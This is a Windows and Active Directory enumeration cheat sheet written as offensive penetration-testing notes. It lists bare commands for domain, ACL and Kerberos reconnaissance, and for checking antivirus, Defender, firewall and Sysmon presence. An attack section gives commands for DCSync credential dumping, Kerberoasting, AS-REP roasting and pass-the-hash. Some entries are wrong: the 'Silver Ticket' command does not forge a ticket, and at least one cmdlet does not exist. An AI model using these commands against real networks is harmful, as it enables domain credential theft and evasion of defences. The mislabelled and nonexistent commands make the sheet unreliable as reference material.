![[Pasted image 20250309112009.png]]


## Windows Enumeration Cheat Sheet

## Basic System Information

- Retrieve system information:

```
systeminfo
```

- Get hostname:

```
hostname
```

- List running processes:

```
tasklist
```

- Show active network connections:

```
netstat -ano
```

- Display current user and privileges:

```
whoami /all
```

## Local User and Group Enumeration

- List all users:

```
net user
```

- Get details about a specific user:

```
net user [username]
```

- List local groups:

```
net localgroup
```

- Show members of the administrators group:

```
net localgroup administrators
```

## Active Directory Enumeration

### Domain Enumeration

- List all users in the domain:

```
dsquery user -limit 50
```

- List all groups in the domain:

```
dsquery group -limit 50
```

- List all computers in the domain:

```
dsquery computer -limit 50
```

- List all domain controllers:

```
dsquery server
```

- Get domain controllers in the domain:

```
nltest /dclist:[domain]
```

- Get domain controller information:

```
nltest /dsgetdc:[domain]
```

- Get all domain users:

```
Get-ADUser -Filter *
```

- Get all domain groups:

```
Get-ADGroup -Filter *
```

- Get all domain computers:

```
Get-ADComputer -Filter *
```

### Domain Trust Enumeration

- Retrieve all domain trusts in the forest:

```
nltest /domain_trusts
```

- List trusted domains:

```
nltest /trusted_domains
```

- Get domain controllers in a domain:

```
nltest /dclist:[domain]
```

- Test domain trust security:

```
dcdiag /test:CheckSecurityError
```

- Get domain trust relationships:

```
Get-ADTrust -Filter *
```

### Group Enumeration

- List all groups in a domain:

```
Get-ADGroup -Filter *
```

- List groups in a specific Organizational Unit (OU):

```
Get-ADGroup -Filter * -SearchBase "OU=Groups,DC=example,DC=com"
```

- List groups a specific user is a member of:

```
Get-ADUser -Identity "username" | Get-ADUserMemberOf
```

- Retrieve details about a specific group:

```
Get-ADGroup -Identity "GroupName"
```

- List all members of a specific group:

```
Get-ADGroupMember -Identity "GroupName"
```

### Group Managed Service Accounts (gMSA) Enumeration

- List all group-managed service accounts (gMSAs) in the domain:

```
Get-ADServiceAccount -Filter {ServiceAccountType -eq 'Group'} -Properties *
```

- Check which gMSAs are installed on a specific machine:

```
Get-ADServiceAccount -Computer "ServerName"
```

### Group Policy Enumeration

- List Group Policy Objects (GPOs):

```
dir "\\<domain_controller>\SYSVOL\<domain>\Policies"
```

- Get applied policies for the current user:

```
gpresult /R
```

- Generate an HTML report of applied policies:

```
gpresult /H report.html
```

- List all GPOs:

```
Get-GPO -All
```

- Generate a report of all GPOs:

```
Get-GPOReport -All -ReportType HTML -Path GPOs.html
```

### Shares Enumeration

- List available shares on a remote system:

```
net view \\\[target]
```

- List shared resources on the local system:

```
net share
```

- Check active SMB connections:

```
net use
```

- Enumerate SMB shares:

```
smbclient -L \\\[target] -U [username]
```

- Get SMB share information:

```
Get-SmbShare
```

### ACL Enumeration

- Check ACLs on directories or files:

```
icacls C:\Users\[username]
```

- Retrieve ACL information:

```
Get-Acl -Path C:\Users\[username]
```

- Check user permissions with Sysinternals AccessChk:

```
accesschk.exe -accepteula -uvqv [target]
```

#### Access Control List (ACL) Enumeration

- Retrieve ACLs for different Active Directory objects:

```
Get-Acl -Path "AD:DC=yourdomain,DC=com" | Format-List
```

- Retrieve ACLs for a specific OU:

```
Get-Acl -Path "AD:OU=Finance,DC=example,DC=com" | Format-List
```

- Retrieve ACLs for a specific group:

```
Get-Acl -Path "AD:CN=Domain Admins,CN=Users,DC=example,DC=com" | Format-List
```

- Find interesting domain ACLs:

```
Find-InterestingDomainAcl
```

- Get the SID of a specific user:

```
$sid = Convert-NameToSid wley
```

- Find ACLs for a specific user:

```
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

- Resolve GUIDs in the output:

```
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

- Enumerate domain user properties:

```
Get-DomainUser -Identity adunn | Select samaccountname, objectsid, memberof, useraccountcontrol | Format-List
```

- Check replication rights:

```
$sid = "S-1-5-21-XXXX-XXXX-XXXX-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get') } | ? { $_.SecurityIdentifier -match $sid } | Select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | Format-List
```

### Kerberos Enumeration

- List Kerberos ticket cache:

```
klist
```

- Locate domain controllers:

```
drslocator /s [domain]
```

- Get active user sessions:

```
Get-NetSession
```

- List currently logged-in users:

```
Get-NetLoggedOn
```

## Attack Vectors Enumeration

### DCSync Attack

- Extract domain credentials using replication privileges:

```
lsadump::dcsync /domain:[domain] /user:[user]
```

### Silver Ticket Attack

- Generate a forged Kerberos ticket for a service:

```
Rubeus.exe tgtdeleg /user:[target_user] /rc4:[hash] /domain:[domain]
```

### Kerberoasting

- Extract service tickets for offline brute-forcing:

```
GetUserSPNs.py [domain]/[user]:[password] -dc-ip [IP]
```

### AS-REP Roasting

- Retrieve AS-REP hashes of users without pre-authentication:

```
GetNPUsers.py [domain]/ -usersfile users.txt -format hashcat -dc-ip [IP]
```

### Pass-the-Hash (PTH)

- Authenticate using an NTLM hash:

```
pth-winexe -U [domain]/[user]%[NTLM hash] //[target] cmd
```


## Antivirus Enumeration
```
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
```

```
wmic /namespace:\\root\securitycenter2 path antivirusproduct
```

## Windows Defender Enumeration
- checking the state of windows Defender
```
Get-Service WinDefend
```

- Checking the current status of win defender
```
Get-MpComputerStatus | select RealTimeProtectionEnabled
```

## Firewall Enumeration
- We can use set-netfirewallprofile  to make changes

```
Get-NetFirewallProfile | Select-Object Name, Enabled
```

```
Get-NetFirewallProfile | Format-List
```

```
netsh advfirewall show allprofiles
```

- Test-NetConnection and TcpClient we can use these to test the inbound connection.
```
Test-NetConnection -ComputerName 127.0.0.1 -Port 80
```
-  we can also test for remote targets in the same network or domain names by specifying in the -ComputerName argument for the Test-NetConnection.

## Event Logs Enumeration 

```
Get-EventLog -List
```

## Sysmon Enumeration
- This is done to check iof sysmon is installed or not
```
Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }
```

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
```


## Installed Apps Enumeration
```
Get-WmiObject -Class Win32_Product
```